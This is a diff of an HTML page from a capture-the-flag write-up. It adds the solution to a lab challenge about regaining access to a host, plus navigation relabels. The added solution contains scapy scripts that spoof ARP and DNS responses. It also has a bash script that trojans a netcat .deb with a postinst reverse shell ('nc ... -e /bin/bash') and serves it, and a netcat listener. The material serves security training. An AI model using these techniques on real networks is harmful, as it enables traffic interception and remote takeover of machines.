@@ -44,8 +44,6 @@
     
     
     
-      <link rel="stylesheet" href="../../css/asciinema-player.css">
-    
       <link rel="stylesheet" href="../../css/extra.css">
     
     
@@ -223,7 +221,7 @@
 
   <li class="md-nav__item">
     <a href="../o1/" class="md-nav__link">
-      Gift List
+      Uncover Santa's Gift List
     </a>
   </li>
 
@@ -236,7 +234,7 @@
 
   <li class="md-nav__item">
     <a href="../o2/" class="md-nav__link">
-      S3 Bucket
+      Investigate S3 Bucket
     </a>
   </li>
 
@@ -249,7 +247,7 @@
 
   <li class="md-nav__item">
     <a href="../o3/" class="md-nav__link">
-      Password Recovery
+      PoS Password Recovery
     </a>
   </li>
 
@@ -262,7 +260,7 @@
 
   <li class="md-nav__item">
     <a href="../o4/" class="md-nav__link">
-      Santavator
+      Operate the Santavator
     </a>
   </li>
 
@@ -275,7 +273,7 @@
 
   <li class="md-nav__item">
     <a href="../o5/" class="md-nav__link">
-      HID Lock
+      Open HID Lock
     </a>
   </li>
 
@@ -288,7 +286,7 @@
 
   <li class="md-nav__item">
     <a href="../o6/" class="md-nav__link">
-      Splunk
+      Splunk Challenge
     </a>
   </li>
 
@@ -301,7 +299,7 @@
 
   <li class="md-nav__item">
     <a href="../o7/" class="md-nav__link">
-      CAN-D-BUS
+      CAN-D-BUS Problem
     </a>
   </li>
 
@@ -314,7 +312,7 @@
 
   <li class="md-nav__item">
     <a href="../o8/" class="md-nav__link">
-      Tag Generator
+      Broken Tag Generator
     </a>
   </li>
 
@@ -392,7 +390,7 @@
 
   <li class="md-nav__item">
     <a href="../o10/" class="md-nav__link">
-      Fingerprint Sensor
+      Defeat Fingerprint Sensor
     </a>
   </li>
 
@@ -404,7 +402,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../o11/" class="md-nav__link">
+    <a href="../o11a/" class="md-nav__link">
       Naughty/Nice List Pt.1
     </a>
   </li>
@@ -417,7 +415,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../o12/" class="md-nav__link">
+    <a href="../o11b/" class="md-nav__link">
       Naughty/Nice List Pt.2
     </a>
   </li>
@@ -589,7 +587,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../hints/h11/" class="md-nav__link">
+    <a href="../../hints/h11a/" class="md-nav__link">
       Snowball Fight
     </a>
   </li>
@@ -613,6 +611,19 @@
   </li>
 
     
+      
+      
+      
+
+
+
+  <li class="md-nav__item">
+    <a href="../../map/" class="md-nav__link">
+      ASCII Map
+    </a>
+  </li>
+
+    
   </ul>
 </nav>
                   </div>
@@ -632,27 +643,205 @@
 <strong>Terminal hint</strong>: <a href="../../hints/h9/">Scapy Prepper</a></p>
 <h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
 <div class="admonition question">
-<p class="admonition-title">Objective</p>
+<p class="admonition-title">Request</p>
 <p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at <code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code>. Who recused herself from the vote described on the document?</p>
 </div>
-<details class="quote"><summary>Alabaster Snowball</summary><p>It seems that some interloper here at the North Pole has taken control of the host.</p>
-<p>We need to regain access to some important documents associated with Kringle Castle.</p>
-<p>Maybe we should try a machine-in-the-middle attack?</p>
-<p>That could give us access to manipulate DNS responses.</p>
-<p>But we'll still need to cook up something to change the HTTP response.</p>
-<p>I'm sure glad you're here Santa.</p>
+<details class="quote"><summary>Alabaster Snowball</summary><p>It seems that some interloper here at the North Pole has taken control of the host.<br/>
+We need to regain access to some important documents associated with Kringle Castle.<br/>
+Maybe we should try a machine-in-the-middle attack?<br/>
+That could give us access to manipulate DNS responses.<br/>
+But we'll still need to cook up something to change the HTTP response.<br/>
+I'm sure glad you're here Santa.</p>
 </details>
 <h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
-<details class="hint"><summary>Sniffy - Alabaster Snowball</summary><p>Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using <code>tcpdump -nni eth0</code> to see if you can view any traffic from that host.</p>
+<details class="hint"><summary>Sniffy</summary><p>Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using <code>tcpdump -nni eth0</code> to see if you can view any traffic from that host.</p>
 </details>
-<details class="hint"><summary>Embedy - Alabaster Snowball</summary><p>The malware on the host does an HTTP request for a <code>.deb</code> package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a></p>
+<details class="hint"><summary>Embedy</summary><p>The malware on the host does an HTTP request for a <code>.deb</code> package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a></p>
 </details>
-<details class="hint"><summary>Resolvy - Alabaster Snowball</summary><p>Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.</p>
+<details class="hint"><summary>Resolvy</summary><p>Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.</p>
 </details>
-<details class="hint"><summary>Spoofy - Alabaster Snowball</summary><p>The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in <code>/home/guest/scripts</code>.</p>
+<details class="hint"><summary>Spoofy</summary><p>The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in <code>/home/guest/scripts</code>.</p>
 </details>
 <h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
-<p>Solution here...</p>
+<p>Solving this challenge requires intercepting the network traffic coming from Jack's computer to trick the device into downloading a malicious <code>.deb</code> package installer containing a reverse shell back to our host. Python scripts (to help with intercepting the ARP and DNS requests) and sample <code>.deb</code> packages are provided but they're missing some key components.</p>
+<h3>Spoof the ARP response</h3>
+<p>Start by running a packet capture to verify the traffic being received.</p>
+<p><img alt="Packet capture 1" src="../../img/objectives/o9/packet_capture_1.png" /></p>
+<p>Update the provided <a href="../../artifacts/objectives/o9/arp_resp.py"><code>arp_resp.py</code></a> script so it sends back an ARP response that tricks Jack's machine into thinking we are host 10.6.6.53. We do that by crafting an ARP response packet that has all field values filled out as they normally would, except for the source MAC address fields. Those should contain our MAC address instead (lines 2 and 11). </p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">packet</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x0806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
+
+    <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="mi">4</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwlen</span> <span class="o">=</span> <span class="mi">6</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="mh">0x0800</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mh">0x01</span>
+
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>
+    <span class="c1"># we need to make it look as if this came from the original host, not us!</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span>
+    <span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
+</code></pre></div>
+</td></tr></table>
+<div class="admonition info">
+<p class="admonition-title">Sample ARP pcap files</p>
+<p>Sample ARP packet captures can be found in <code>~/pcaps/arp.pcap</code> and on <a href="https://www.cloudshark.org/captures/d97c5b81b057">cloudshark.org</a>.</p>
+</div>
+<p>Start a new packet capture and run the updated <a href="../../tools/objectives/o9/arp_resp.py"><code>arp_resp.py</code></a> script.</p>
+<p><img alt="Spoof ARP response" src="../../img/objectives/o9/attack_1.png" /></p>
+<p>We successfully tricked Jack's machine into sending a DNS request for <code>ftp.osuosl.org</code> our way.</p>
+<p><img alt="Packet capture 2" src="../../img/objectives/o9/packet_capture_2.png" /></p>
+<h3>Spoof the DNS response</h3>
+<p>Next, <a href="https://www.securitynik.com/2014/05/building-your-own-tools-with-scapy.html">craft a DNS response</a> to trick Jack's hijacked machine into thinking <em>ftp.osuosl.org</em> is actually our host. In other words, force the DNS request for <em>ftp.osuosl.org</em> to resolve to our IP address. Update the provided <a href="../../artifacts/objectives/o9/dns_resp.py"><code>dns_resp.py</code></a> script by changing <code>ipaddr_we_arp_spoofed</code> to <em>10.6.6.53</em> and add the missing DNS details to the <code>handle_dns_request()</code> function.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">handle_dns_request</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+    <span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">)</span>     
+    <span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">ipaddr_we_arp_spoofed</span><span class="p">)</span>
+    <span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span><span class="p">)</span>  <span class="c1"># swap ports</span>
+
+    <span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
+        <span class="nb">id</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
+        <span class="n">qr</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">opcode</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">opcode</span><span class="p">,</span>
+        <span class="n">aa</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">qdcount</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qdcount</span><span class="p">,</span>
+        <span class="n">ancount</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+        <span class="n">qd</span><span class="o">=</span><span class="n">DNSQR</span><span class="p">(</span>
+            <span class="n">qname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span>
+            <span class="n">qtype</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qtype</span><span class="p">,</span>
+            <span class="n">qclass</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qclass</span>
+        <span class="p">),</span>
+        <span class="n">an</span><span class="o">=</span><span class="n">DNSRR</span><span class="p">(</span>
+            <span class="n">rrname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span>
+            <span class="n">rdata</span><span class="o">=</span><span class="n">ipaddr</span><span class="p">,</span>
+            <span class="n">ttl</span><span class="o">=</span><span class="mi">86400</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+
+    <span class="n">dns_response</span> <span class="o">=</span> <span class="n">eth</span> <span class="o">/</span> <span class="n">ip</span> <span class="o">/</span> <span class="n">udp</span> <span class="o">/</span> <span class="n">dns</span>
+    <span class="n">sendp</span><span class="p">(</span><span class="n">dns_response</span><span class="p">,</span> <span class="n">iface</span><span class="o">=</span><span class="s2">&quot;eth0&quot;</span><span class="p">)</span>
+</code></pre></div>
+</td></tr></table>
+<div class="admonition info">
+<p class="admonition-title">Sample DNS pcap files</p>
+<p>Sample DNS packet captures can be found in <code>~/pcaps/dns.pcap</code> and on <a href="https://www.cloudshark.org/captures/0320b9b57d35">cloudshark.org</a>.</p>
+</div>
+<p>Start a packet capture and run the updated <a href="../../tools/objectives/o9/dns_resp.py"><code>dns_resp.py</code></a> script, followed by the <a href="../../tools/objectives/o9/arp_resp.py"><code>arp_resp.py</code></a> script. </p>
+<p><img alt="Spoof DNS response" src="../../img/objectives/o9/attack_2.png" /></p>
+<p>Besides the ARP and DNS requests (and our spoofed responses), we're now capturing even more traffic from Jack's machine.</p>
+<p><img alt="Packet capture 3" src="../../img/objectives/o9/packet_capture_3.png" /></p>
+<p>Running a simple Python web server using <code>python3 -m http.server 80</code> will tell us that Jack's hijacked machine is making a failed HTTP GET request to <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>. Let's host a <a href="http://www.wannescolman.be/?p=98">malicious payload</a> there. <img alt="😈" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f608.svg" title=":smiling_imp:" /></p>
+<h3>Create the payload</h3>
+<p>The best package candidate in <code>~/debs/</code> is probably <code>netcat-traditional_1.10-41.1ubuntu1_amd64.deb</code> as it will install the <code>nc</code> binary we need to establish the <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">reverse shell</a> connection back to our machine. It also provides a <code>postinst</code> file where we can add the reverse shell command itself to make it execute as part of the package post-install phase.</p>
+<p>To help remove some of the tedious packaging and setup work create a <a href="../../tools/objectives/o9/prepare_package.sh"><code>prepare_package.sh</code></a> script that unpacks <code>netcat-traditional_1.10-41.1ubuntu1_amd64.deb</code> (lines 9-13), adds the <code>nc</code> reverse shell command to the <code>postinst</code> file (line 18), packages everything back up (line 20), creates the proper directory structure for the HTTP request to succeed (line 22), and start a Python web server to host the <code>.deb</code> file (line 27).</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/bash</span>
+<span class="c1"># Start at the right place</span>
+<span class="nb">cd</span> <span class="nv">$HOME</span>/debs/
+<span class="c1"># Unpack the deb package components</span>
+<span class="nb">export</span> <span class="nv">MYDEB</span><span class="o">=</span>netcat-traditional_1.10-41.1ubuntu1_amd64.deb 
+mkdir packing
+<span class="nb">cd</span> packing
+cp ../<span class="nv">$MYDEB</span> .
+dpkg -x <span class="nv">$MYDEB</span> work
+mkdir -p work/DEBIAN
+ar -x <span class="nv">$MYDEB</span>
+tar -xf control.tar.xz ./control
+tar -xf control.tar.xz ./postinst
+mv control work/DEBIAN/
+mv postinst work/DEBIAN/
+<span class="c1"># Add the reverse shell command to postinst</span>
+<span class="nb">export</span> <span class="nv">my_ip</span><span class="o">=</span><span class="sb">`</span>hostname -I<span class="sb">`</span>
+<span class="nb">echo</span> <span class="s2">&quot;/bin/nc </span><span class="si">${</span><span class="nv">my_ip</span><span class="si">}</span><span class="s2"> 8888 -e /bin/bash&quot;</span> &gt;&gt; work/DEBIAN/postinst
+<span class="c1"># Build the package</span>
+dpkg-deb --build work/
+<span class="c1"># Create the path the rogue host is requesting</span>
+mkdir -p <span class="nv">$HOME</span>/web/pub/jfrost/backdoor/
+<span class="c1"># Move the malicious package file into place</span>
+mv work.deb <span class="nv">$HOME</span>/web/pub/jfrost/backdoor/suriv_amd64.deb
+<span class="c1"># Start the web server</span>
+<span class="nb">cd</span> <span class="nv">$home</span>/web/
+python3 -m http.server <span class="m">80</span>
+</code></pre></div>
+</td></tr></table>
+<h3>Run the exploit</h3>
+<p>Now that all the required components are in place, open 3 additional Tmux windows (for a total of 4). One window should already be running the Python webserver. Use the remaining 3 windows to first start a netcat listener with <code>nc -nlvp 8888</code> that will accept the incoming reverse shell connection, then the updated <a href="../../tools/objectives/o9/dns_resp.py"><code>dns_resp.py</code></a> script, and finally the modified <a href="../../tools/objectives/o9/arp_resp.py"><code>arp_resp.py</code></a> script.</p>
+<p><img alt="Web server log" src="../../img/objectives/o9/attack_3.png" /></p>
+<p>The hijacked host will be redirected to our web server, download the malicious <code>suriv_amd64.deb</code> file, install it, and open a reverse shell as part of the <code>.deb</code> package post-install process.</p>
+<p><img alt="Reverse shell" src="../../img/objectives/o9/attack_4.png" /></p>
+<p>We now have access to the meeting minutes located at <a href="../../artifacts/objectives/o9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt"><code>/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code></a>.</p>
+<div class="admonition abstract">
+<p class="admonition-title">NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</p>
+<p>...</p>
+<p>RESOLUTIONS:</p>
+<p>The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  <strong>Tanta Kringle</strong> recused herself from the vote given her adoption of Kris Kringle as a son early in his life. </p>
+<p>...</p>
+</div>
 <div class="admonition done">
 <p class="admonition-title">Answer</p>
 <p>Tanta Kringle</p>
@@ -684,7 +873,7 @@
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                Tag Generator
+                Broken Tag Generator
               </div>
             </div>
           </a>
@@ -696,7 +885,7 @@
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                Fingerprint Sensor
+                Defeat Fingerprint Sensor
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
@@ -765,8 +954,6 @@
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
         <script src="../../js/tables.js"></script>
-      
-        <script src="../../js/asciinema-player.js"></script>
       
     
   </body>
